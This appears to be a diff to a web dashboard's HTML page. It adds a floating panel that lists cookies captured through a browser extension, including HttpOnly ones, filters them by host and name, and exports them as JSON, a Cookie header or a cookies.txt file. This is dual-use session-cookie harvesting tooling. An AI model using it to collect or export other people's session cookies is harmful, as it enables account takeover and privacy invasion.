@@ -28,6 +28,7 @@
               else if (m.type === 'cleared') emit('capture:cleared', m);
               else if (m.type === 'reloaded') emit('capture:reloaded', m);
               else if (m.type === 'captcha') emit('capture:captcha', m);
+              else if (m.type === 'cookie-snapshot' || m.type === 'set-cookie-capture') emit('capture:cookie', m);
             } catch {}
           };
           ws.onclose = () => setTimeout(connectWs, 2000);
@@ -96,6 +97,10 @@
           onReloaded: (cb) => { on('capture:reloaded', cb); return () => off('capture:reloaded', cb); },
           onCaptcha: (cb) => { on('capture:captcha', cb); return () => off('capture:captcha', cb); },
           onAppFilterChanged: (cb) => { on('capture:app-filter-changed', cb); return () => off('capture:app-filter-changed', cb); },
+          getCookies: () => api('/api/cookies').then(d => d.cookies || []),
+          exportCookies: () => api('/api/cookies/export'),
+          clearCookies: () => api('/api/cookies', { method: 'DELETE' }).then(() => true),
+          onCookie: (cb) => { on('capture:cookie', cb); return () => off('capture:cookie', cb); },
         };
       })();
     </script>
@@ -104,5 +109,96 @@
   </head>
   <body>
     <div id="root"></div>
+    <div id="health-chip" style="position:fixed;left:12px;bottom:12px;z-index:99999;background:#111827;color:#e5e7eb;border:1px solid #374151;border-radius:999px;padding:8px 12px;font:12px/1.3 ui-sans-serif,system-ui;max-width:70vw">health…</div>
+    <div id="cookie-panel" style="position:fixed;right:12px;bottom:12px;z-index:99999;width:min(460px,94vw);max-height:55vh;overflow:auto;background:#111827;color:#e5e7eb;border:1px solid #374151;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,.35);font:12px/1.4 ui-sans-serif,system-ui">
+      <div style="display:flex;gap:8px;align-items:center;justify-content:space-between;padding:10px 12px;border-bottom:1px solid #374151;position:sticky;top:0;background:#111827">
+        <strong>Cookies</strong>
+        <div style="display:flex;gap:6px;flex-wrap:wrap;justify-content:flex-end">
+          <button id="cp-refresh" style="background:#2563eb;color:#fff;border:0;border-radius:8px;padding:6px 8px;cursor:pointer">Refresh</button>
+          <button id="cp-export-json" style="background:#059669;color:#fff;border:0;border-radius:8px;padding:6px 8px;cursor:pointer">JSON</button>
+          <button id="cp-export-header" style="background:#0d9488;color:#fff;border:0;border-radius:8px;padding:6px 8px;cursor:pointer">Header</button>
+          <button id="cp-export-txt" style="background:#7c3aed;color:#fff;border:0;border-radius:8px;padding:6px 8px;cursor:pointer">cookies.txt</button>
+          <button id="cp-clear" style="background:#7f1d1d;color:#fff;border:0;border-radius:8px;padding:6px 8px;cursor:pointer">Clear</button>
+          <button id="cp-hide" style="background:#374151;color:#fff;border:0;border-radius:8px;padding:6px 8px;cursor:pointer">Hide</button>
+        </div>
+      </div>
+      <div style="padding:8px 12px;display:flex;gap:6px;flex-wrap:wrap;border-bottom:1px solid #1f2937">
+        <input id="cp-host" placeholder="host filter" style="flex:1;min-width:110px;background:#0b1220;border:1px solid #374151;color:#e5e7eb;border-radius:8px;padding:6px 8px"/>
+        <input id="cp-name" placeholder="name filter (xs)" style="flex:1;min-width:110px;background:#0b1220;border:1px solid #374151;color:#e5e7eb;border-radius:8px;padding:6px 8px"/>
+        <label style="display:flex;align-items:center;gap:4px;color:#9ca3af"><input id="cp-httponly" type="checkbox"/> HttpOnly</label>
+      </div>
+      <div id="cp-meta" style="padding:8px 12px;color:#9ca3af"></div>
+      <pre id="cp-list" style="margin:0;padding:0 12px 12px;white-space:pre-wrap;word-break:break-all"></pre>
+    </div>
+    <button id="cp-show" style="display:none;position:fixed;right:12px;bottom:12px;z-index:99999;background:#111827;color:#e5e7eb;border:1px solid #374151;border-radius:999px;padding:10px 14px;cursor:pointer">Cookies</button>
+    <script>
+      (function(){
+        const panel=document.getElementById('cookie-panel');
+        const list=document.getElementById('cp-list');
+        const meta=document.getElementById('cp-meta');
+        const showBtn=document.getElementById('cp-show');
+        const health=document.getElementById('health-chip');
+        const hostEl=document.getElementById('cp-host');
+        const nameEl=document.getElementById('cp-name');
+        const httpOnlyEl=document.getElementById('cp-httponly');
+        function qs(){
+          const p=new URLSearchParams();
+          p.set('limit','300');
+          if(hostEl.value.trim()) p.set('host', hostEl.value.trim());
+          if(nameEl.value.trim()) p.set('name', nameEl.value.trim());
+          if(httpOnlyEl.checked) p.set('httpOnly','1');
+          return p.toString();
+        }
+        async function refreshHealth(){
+          try{
+            const h=await fetch('/api/health').then(r=>r.json());
+            const age=h.lastCookieAt? Math.round((Date.now()-h.lastCookieAt)/1000)+'s':'—';
+            health.textContent = (h.ok?'OK':'DOWN')
+              + ' · ' + (h.backend||'?')
+              + ' · redis ' + (h.redisOk?'on':'off')
+              + ' · ext ' + (h.extensionConnected?'on':'off')
+              + ' · last cookie ' + age;
+            health.style.borderColor = h.ok ? '#065f46' : '#7f1d1d';
+          }catch(e){ health.textContent='health failed'; }
+        }
+        async function refresh(){
+          try{
+            const d=await fetch('/api/cookies?'+qs()).then(r=>r.json());
+            const rows=d.cookies||[];
+            meta.textContent = rows.length + ' cookies · session ' + (d.sessionId||'?') + ' · ' + (d.backend||'') + (d.redis?' · redis':'');
+            list.textContent = rows.slice(0,150).map(c => `${c.host||''}  ${c.name}=${String(c.value||'').slice(0,80)}${c.httpOnly?'  [HttpOnly]':''}`).join('\n') || '(empty)';
+          }catch(e){ meta.textContent='failed: '+e.message; }
+        }
+        function download(name, text, type){
+          const blob=new Blob([text],{type:type||'text/plain'});
+          const a=document.createElement('a'); a.href=URL.createObjectURL(blob); a.download=name; a.click();
+        }
+        document.getElementById('cp-refresh').onclick=refresh;
+        document.getElementById('cp-export-json').onclick=async()=>{
+          const d=await fetch('/api/cookies/export?format=latest&'+qs().replace('limit=300','')).then(r=>r.json());
+          download('cookies-export.json', JSON.stringify(d,null,2), 'application/json');
+        };
+        document.getElementById('cp-export-header').onclick=async()=>{
+          const d=await fetch('/api/cookies/export?format=header&'+qs().replace('limit=300','')).then(r=>r.json());
+          download('cookie-header.txt', d.cookieHeader || Object.entries(d.headersByHost||{}).map(([h,v])=>h+'\n'+v).join('\n\n'));
+        };
+        document.getElementById('cp-export-txt').onclick=async()=>{
+          const txt=await fetch('/api/cookies/export?format=netscape&'+qs().replace('limit=300','')).then(r=>r.text());
+          download('cookies.txt', txt);
+        };
+        document.getElementById('cp-clear').onclick=async()=>{ await fetch('/api/cookies',{method:'DELETE'}); refresh(); };
+        document.getElementById('cp-hide').onclick=()=>{ panel.style.display='none'; showBtn.style.display='block'; };
+        showBtn.onclick=()=>{ panel.style.display='block'; showBtn.style.display='none'; refresh(); };
+        hostEl.oninput=nameEl.oninput=()=>{ clearTimeout(window.__cpf); window.__cpf=setTimeout(refresh,250); };
+        httpOnlyEl.onchange=refresh;
+        try{
+          const ws=new WebSocket((location.protocol==='https:'?'wss://':'ws://')+location.host+'/ws');
+          ws.onmessage=(e)=>{ try{ const m=JSON.parse(e.data); if(m.type==='cookie-snapshot'||m.type==='set-cookie-capture'||m.type==='request') { refresh(); refreshHealth(); } }catch{} };
+        }catch{}
+        setTimeout(()=>{ refresh(); refreshHealth(); }, 500);
+        setInterval(refresh, 10000);
+        setInterval(refreshHealth, 5000);
+      })();
+    </script>
   </body>
 </html>
